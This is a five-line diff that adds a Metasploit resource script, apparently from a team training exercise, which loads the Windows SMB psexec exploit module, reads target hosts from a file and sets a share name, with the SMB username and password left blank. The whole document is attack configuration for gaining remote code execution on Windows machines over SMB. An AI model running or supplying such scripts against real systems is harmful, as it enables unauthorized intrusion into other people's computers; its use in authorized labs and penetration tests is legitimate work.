@@ -1,0 +1,5 @@
+use exploit/windows/smb/psexec
+set RHOSTS /root/Desktop/Excercise_1/Team_2/smbBoxes
+set SHARE CommonShare$
+set SMBPass
+set SMBUser
